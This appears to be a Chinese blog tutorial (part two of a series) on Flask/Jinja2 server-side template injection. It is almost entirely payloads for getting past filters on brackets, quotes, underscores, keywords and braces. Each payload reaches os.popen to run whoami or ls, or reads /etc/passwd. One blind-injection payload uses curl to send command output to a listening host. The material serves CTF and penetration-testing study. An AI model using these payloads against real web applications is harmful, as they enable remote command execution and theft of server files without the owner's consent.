# 原创
：  【SSTI模块注入】SSTI+Flask+Python（下）：绕过过滤

# 【SSTI模块注入】SSTI+Flask+Python（下）：绕过过滤

**目录**

[一、绕过[]过滤](#%E4%B8%80%E3%80%81%E7%BB%95%E8%BF%87%5B%5D%E8%BF%87%E6%BB%A4)

[方法一：__getitem__](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A__getitem__)

[方法二：pop()](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Apop%28%29)

[二、绕过引号'过滤](#%E4%BA%8C%E3%80%81%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7'%20rel=)

[方法一：对象request（jinjia2）](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%AF%B9%E8%B1%A1request%EF%BC%88jinjia2%EF%BC%89)

[方法二：chr函数](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Achr%E5%87%BD%E6%95%B0)

[三、绕过下划线_过滤](#%E4%B8%89%E3%80%81%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF_%E8%BF%87%E6%BB%A4)

[方法一：request.args.](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Arequest.args.)

[四、关键字过滤](#%E5%9B%9B%E3%80%81%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4)

[方法一：拼接](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%8B%BC%E6%8E%A5)

[方法二：内置函数](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0)

[方法三：转换](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E8%BD%AC%E6%8D%A2)

[五、绕过花括号{}过滤](#%E4%BA%94%E3%80%81%E7%BB%95%E8%BF%87%E8%8A%B1%E6%8B%AC%E5%8F%B7%7B%7D%E8%BF%87%E6%BB%A4)

[方法一：{% if ... %}1{% endif %}](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%7B%25%20if%20...%20%25%7D1%7B%25%20endif%20%25%7D)

---


## 一、绕过[]过滤

> 
<h3>方法一：__getitem__</h3>
''.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__["popen"]("whoami").read()


> 
<h3>方法二：pop()</h3>
移除列表中的一个元素（默认最后一个元素），并且返回该元素的值
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()


---


---


## 二、绕过引号'过滤

> 
<h3>方法一：对象request（jinjia2）</h3>
1、
{{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[request.args.arg1]}}&amp;arg1=os
args是数组，可以进行自定义传值
<hr/>
2、
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd


> 
<h3>方法二：chr函数</h3>
1、
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
<hr/>
2、
%2b是+，char()可以查看ASCII码对应表
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}


---


---


## 三、绕过下划线_过滤

> 
<h3>方法一：request.args.</h3>
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
GET传参：request.args

POST传参：request.values


---


---


## 四、关键字过滤

> 
<h3>方法一：拼接</h3>
{{request['__cl'+'ass__'].__mro__[12]}}
或者
.__init__.__globals__["sys"+"tem"]
<hr/>
~ 在jinja中可以拼接字符串


> 
<h3>方法二：内置函数</h3>
replace、decode……


> 
<h3>方法三：转换</h3>
{{"".__class__}} 
转换为十六进制进行绕过
{{""["\x5f\x5fclass\x5f\x5f"]}}


---


---


## 五、绕过花括号{}过滤

> 
<h3>方法一：{% if ... %}1{% endif %}</h3>
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
<hr/>
配合盲注
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %}

